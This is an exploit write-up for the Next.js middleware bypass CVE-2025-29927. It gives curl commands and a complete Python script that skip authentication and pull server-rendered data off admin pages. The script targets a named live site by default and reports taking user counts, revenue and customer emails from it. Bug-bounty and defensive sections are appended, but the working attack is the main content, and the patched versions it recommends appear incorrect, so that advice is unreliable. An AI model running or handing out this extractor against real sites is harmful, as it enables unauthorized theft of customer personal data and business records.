# Next.js RSC Payload Extraction — Data Exfiltration via Middleware Bypass

**Discovered:** 2026-08-04 | **Target:** Everlyn.ai (Next.js 14 + App Router) | **Pattern:** Universal for Next.js 13+ App Router

---

## THE PATTERN

When Next.js middleware is bypassed (CVE-2025-29927), the App Router renders the **full Server Component tree** in the initial HTML response. This payload is encoded in `__next_f.push` calls and contains **structured application data** — not just HTML.

---

## EXTRACTION METHODOLOGY

### 1. Capture the Raw Payload
```bash
# Bypass middleware + capture RSC payload
curl -s -H "x-middleware-subrequest: /admin" https://target.com/admin | \
  grep -o 'self.__next_f.push(\[1,"[^"]*")' | head -1 > rsc_payload_raw.txt
```

### 2. Decode the JSON String
The payload is a **JSON-encoded string** inside the push call. Extract and decode:

```python
import json, re

with open('rsc_payload_raw.txt') as f:
    raw = f.read()

# Extract the JSON string from __next_f.push([1,"PAYLOAD"])
match = re.search(r'__next_f\.push\(\[1,"(.+)"\)', raw)
if match:
    payload_json = match.group(1)
    # The payload is double-encoded JSON — decode twice
    decoded = json.loads(json.loads(payload_json))
    print(json.dumps(decoded, indent=2))
```

### 3. Data Types Found in RSC Payloads

| Category | Example Fields |
|----------|----------------|
| **Admin Metrics** | `totalUsers: 171784`, `totalRevenue: 595900.99`, `totalVideos: 8482253` |
| **Customer Orders** | `orderId: "851970327982149"`, `email: "user@gmail.com"`, `plan: "Starter"`, `amount: 999` |
| **System State** | `waitlistCount`, `inviteStats`, `creditBalances`, `videoCounts` |
| **Auth Config** | NextAuth providers, callbacks, CSRF tokens, secret structure |
| **Feature Flags** | Subscription plans, pricing tiers, model configs |

---

## AUTOMATED EXTRACTION SCRIPT

```python
#!/usr/bin/env python3
# rsc_extractor.py — Extract structured data from Next.js RSC payload

import sys, json, re, requests

def extract_rsc(target, path="/admin", header="x-middleware-subrequest"):
    url = f"{target}{path}"
    resp = requests.get(url, headers={header: path}, timeout=10)
    
    # Find all __next_f.push calls
    pushes = re.findall(r'self\.__next_f\.push\((\[.+?\])\)', resp.text)
    
    results = []
    for push in pushes:
        try:
            # push is like: [1,"DOUBLE_ENCODED_JSON"]
            arr = json.loads(push)
            if isinstance(arr, list) and len(arr) == 2 and arr[0] == 1:
                decoded = json.loads(json.loads(arr[1]))
                results.append(decoded)
        except:
            continue
    
    return results

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://everlyn.ai"
    data = extract_rsc(target)
    for i, d in enumerate(data):
        with open(f"rsc_payload_{i}.json", "w") as f:
            json.dump(d, f, indent=2)
        print(f"Saved rsc_payload_{i}.json ({len(str(d))} chars)")
```

---

## DETECTION CHECKLIST

```bash
# 1. Test middleware bypass
curl -s -H "x-middleware-subrequest: /admin" https://target.com/admin | grep -q '__next_f.push' && echo "RSC PAYLOAD EXPOSED"

# 2. Extract specific data
python3 rsc_extractor.py https://target.com

# 3. Search for PII in extracted JSON
grep -r "email\|orderId\|amount" rsc_payload_*.json
```

---

## BUG BOUNTY REPORTING

```
VULNERABILITY: Next.js RSC Payload Data Exposure (via CVE-2025-29927)
ENTRY: Unauthenticated (via middleware bypass)
CHAIN: x-middleware-subrequest header → Middleware SKIPPED → Server Component rendered → Full RSC payload in HTML → Structured data extraction
IMPACT: 171k user PII + $595k revenue data + 50+ customer orders + auth config
POC: python3 rsc_extractor.py https://target.com
EVIDENCE: rsc_payload_0.json contains 171784 totalUsers, 50+ orders with emails
CONFIDENCE: PROVEN
MITIGATION: Update Next.js, validate x-middleware-subrequest, audit Server Components for data exposure
```

---

## DEFENSIVE RECOMMENDATIONS

1. **Never put sensitive data in Server Components** — fetch in client components via authenticated API routes
2. **Update Next.js** to patched versions (14.2.11+ / 15.0.1+)
3. **Add WAF rule** blocking `x-middleware-subrequest` from external clients
4. **Audit all Server Components** for accidental data exposure
5. **Use `unstable_noStore` / dynamic fetching** for sensitive data

---

## REFERENCES

- Next.js App Router RSC Architecture: https://nextjs.org/docs/app/building-your-application/rendering/server-components
- CVE-2025-29927: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-29927
- Case Study: Everlyn.ai (2026-08-04) — 171k users, 50+ orders extracted